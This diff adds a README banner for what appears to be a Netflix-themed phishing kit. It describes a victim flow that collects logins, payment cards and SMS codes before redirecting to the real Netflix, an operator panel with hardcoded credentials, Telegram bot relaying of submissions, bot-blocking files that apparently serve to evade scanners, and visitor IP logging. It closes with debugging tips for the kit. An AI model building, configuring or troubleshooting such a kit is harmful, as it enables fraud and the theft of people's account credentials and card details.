@@ -1,0 +1,59 @@
+╔═════════════════════════════════════════════════════════════════════╗
+║                                                                     ║
+║   █████╗ ██╗  ██╗███████╗██╗     ██╗ ██████╗██╗  ██╗███████╗██████╗ ║
+║  ██╔══██╗██║ ██╔╝██╔════╝██║     ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗║
+║  ███████║█████╔╝ █████╗  ██║     ██║██║     █████╔╝ █████╗  ██████╔╝║
+║  ██╔══██║██╔═██╗ ██╔══╝  ██║     ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗║
+║  ██║  ██║██║  ██╗███████╗███████╗██║╚██████╗██║  ██╗███████╗██║  ██║║
+║  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝║
+║                                                                     ║
+║              ╔══════════════════════════════════════╗               ║
+║              ║   I T A C H I  -  C Y B E R C O M    ║               ║
+║              ║         [ AUTHORIZED ACCESS ]        ║               ║
+║              ╚══════════════════════════════════════╝               ║
+║                                                                     ║
+║  ───────────────────────────────────────────────────────────────────║
+║                                                                     ║
+║  ▸ PROJECT    : Netflix Clone - Authentication Panel System         ║
+║  ▸ VERSION    : 2.0 (ITACHI Edition)                                ║
+║  ▸ AUTHOR     : Itachi (Cyber Command)                              ║
+║  ▸ CONTACT    : https://t.me/itachi3d                               ║
+║                                                                     ║
+║  ───────────────────────────────────────────────────────────────────║
+║                                                                     ║
+║  ▸ PRO TIPS & NOTES                                                 ║
+║  ───────────────────────────────────────────────────────────────────║
+║                                                                     ║
+║  1. AUTH FLOW CONTROL                                               ║
+║     Login → verify→ Card → SMS → Wait → Exit → Netflix              ║
+║     Every step validates user data before proceeding.               ║
+║                                                                     ║
+║  2. PANEL DASHBOARD /   user:admin   pass:itachi3d                  ║                             ║
+║     Access at /auth/panel/ — admin interface for monitoring         ║
+║     All form submissions POST to submit.php via sendBeacon().       ║
+║                                                                     ║
+║  3. TELEGRAM BOT INTEGRATION                                        ║
+║     Bot polls panel/check.php every 3s for redirect status.         ║
+║     Config stored in auth/panel/data/config.json                    ║
+║     chat_id and bot_token control all notifications.                ║
+║                                                                     ║
+║  4. SECURITY LAYERS                                                 ║
+║     • shield.php + badbots.txt — bot detection & blocking           ║
+║     • Circuit breaker in panel.php — prevents cascade failures      ║
+║     • All user inputs validated server-side in submit.php           ║
+║                                                                     ║
+║  5. VISITOR TRACKING                                                ║
+║     Auto-logs to auth/panel/data/visitors.json                      ║
+║     Tracks IP, timestamp, and navigation path per session.          ║
+║                                                                     ║
+║  6. COMMON DEBUG PATHS                                              ║
+║     • Broken redirect? Check wait.php countdown & URL params        ║
+║     • Form not submitting? Verify sendBeacon() target is submit.php ║
+║     • Bot not responding? Confirm config.json chat_id & bot_token   ║
+║     • Panel 403? Check shield.php badbots.txt for blocked IPs       ║
+║  ───────────────────────────────────────────────────────────────────║
+║                                                                     ║
+║  ▸ STATUS: ALL SYSTEMS OPERATIONAL                                  ║
+║  ▸ LAST UPDATED: 2026-07-30                                         ║
+║                                                                     ║
+╚═════════════════════════════════════════════════════════════════════╝
